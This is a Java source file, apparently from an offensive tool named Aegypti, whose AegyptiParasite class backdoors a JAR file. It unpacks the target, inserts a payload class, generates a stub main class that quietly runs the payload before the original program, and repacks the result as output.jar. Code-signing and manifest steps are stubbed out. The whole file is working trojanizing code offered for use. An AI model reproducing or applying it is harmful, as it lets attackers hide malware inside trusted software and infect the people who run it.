package io.github.tesla.Aegypti;

import java.io.File;
import java.util.jar.Attributes;
import java.util.jar.Manifest;

public class AegyptiParasite {
	private String payloadPath;
	private String jarPath;
	private AegyptiCompression ac;
	private AegyptiDecompression ad;
	private AegyptiCompiler acmp;
//	private AegyptiCertificateGenerator accg;
//	private AegyptiCodeCertificateStuff accs;
	private Attributes attr;
	private String mainClass;
	private Manifest manifest;
	public AegyptiParasite(String payloadPath, String jarPath) {
		this.payloadPath = payloadPath;
		this.jarPath = jarPath;
	}
	public void backdoor() {
		initAttributesVars();
		decompressIntoTmp();
		moveInPoison();
//		moveInTmp();
		genMainStub();
//		changeUpManifest();
//		doCodeSigningStuffs();
		recompress();
		
	}
	private void initAttributesVars() {
		ad = new AegyptiDecompression(jarPath);
		manifest = ad.getManifest();
		attr = (Attributes)manifest.getMainAttributes();
		mainClass = attr.getValue("Main-Class");
	}
	private void decompressIntoTmp() {
		ad.decompress();
	}
//	private void moveInTmp() {
//		// Get the new compiled tmp file
//		File newMainClassF = new File("Tmp.class");
//		newMainClassF.renameTo(new File("tmp"+File.separator+"Tmp.class"));
//		
//	}
	private void genMainStub() {
		acmp = new AegyptiCompiler("tmp" + File.separator + "Tmp", String.format("public class Tmp { public static void main(String[] args) { try { %s.main(args); } catch (Exception e) {} %s.main(args); }}", payloadPath.split(File.separator)[payloadPath.split(File.separator).length-1].replace(".class", ""), mainClass));
		acmp.compile();
		System.out.println("[*] Created stub class at "+new File("tmp.class").getAbsolutePath());
		// Delete the old source file
		File tmpSrc = new File("Tmp.java");
		tmpSrc.delete();
	}

	private void moveInPoison() {
		File poison = new File(payloadPath);
		System.out.println("[*] Copying "+poison.toPath()+" to "+"tmp"+File.separator+payloadPath.split(File.separator)[0]);
//			FileUtils.copyDirectory(poison.getAbsolutePath(), "tmp"+File.separator+payloadPath.split(File.separator)[0]);
		new File(payloadPath).renameTo(new File("tmp"+File.separator+payloadPath.split(File.separator)[0]));
		System.out.println("[*] Copying poisoned file into tmp folder. . .");
	}
//	private void changeUpManifest() {
//		
//	}
//	private void doCodeSigningStuffs() {
//		
//	}
	private void recompress() {
		System.out.println("[*] Creating output.jar");
		ac = new AegyptiCompression("output.jar", manifest);
		ac.compress(new File("tmp").listFiles());
	}
 }
